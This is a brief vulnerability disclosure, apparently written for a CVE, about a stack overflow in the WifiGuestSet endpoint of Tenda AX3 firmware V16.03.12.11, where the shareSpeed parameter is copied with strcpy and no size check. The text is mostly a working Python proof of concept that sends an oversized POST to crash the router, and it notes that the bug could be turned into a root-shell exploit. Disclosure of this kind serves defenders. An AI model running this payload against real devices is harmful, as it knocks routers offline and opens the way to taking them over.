# Tenda AX3 V16.03.12.11 Stack overflow vulnerability

## Firmware information

- Manufacturer's address：https://www.tenda.com.cn/

- Firmware download address ： https://www.tenda.com.cn/download/detail-3476.html

## Affected version

![](https://github.com/yjzy00001/CVE/blob/main/vuln/WifiGuestSet/img/1.png)

## Vulnerability details

![](https://github.com/yjzy00001/CVE/blob/main/vuln/WifiGuestSet/img/2.png)

In /goform/WifiGuestSet，The user passes in shareSpeed, and then the program will use strcpy to copy shareSpeed to shared_up_speed. It is worth noting that there is no size check, which leads to stack overflow vulnerabilities.

## Poc

```python
import requests

url = "http://192.168.0.1/goform/WifiGuestSet"

shareSpeed = "a" * 0x2000

r = requests.post(url, data={'shareSpeed': shareSpeed})
print(r.content)
```

You can see the router crash, and finally you can write exp to get root shell
